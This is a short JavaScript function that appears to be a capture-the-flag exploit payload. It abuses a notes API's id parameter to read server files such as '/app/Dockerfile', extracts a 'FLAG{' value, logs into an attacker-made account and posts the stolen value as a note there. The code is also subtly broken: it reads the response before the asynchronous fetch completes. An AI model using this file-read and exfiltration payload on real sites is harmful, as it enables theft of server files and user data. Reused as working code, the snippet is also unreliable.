function f(cookie) {
    let url = "/api/notes?id=/app/Dockerfile";
    // let url = "/api/notes?id=/etc/hosts";
    let url2 = "/api/notes";
    let data = { "title": "fail", "content": "fail'FLAG{12345" };

    fetch(url)
        .then(
            (response) => {
                return response.json();
            }
        ).then(
            (response) => {
                data = response;
            });


    let flag = data.content.split("'FLAG{")[1].substring(0, 100);

    fetch(
        "/login", {
        method: "POST",
        headers: {
            "content-type": "application/x-www-form-urlencoded"
        },
        body: "username=qweasd&password=qweasd"
    }).then(
        (response) => {
            fetch(
                url2, {
                method: "POST",
                headers: {
                    "content-type": "application/json",
                    "cookie": "session=" + cookie
                },
                body: JSON.stringify({ "title": data.title, "content": flag })
            }
            );
        });
    return ""
}
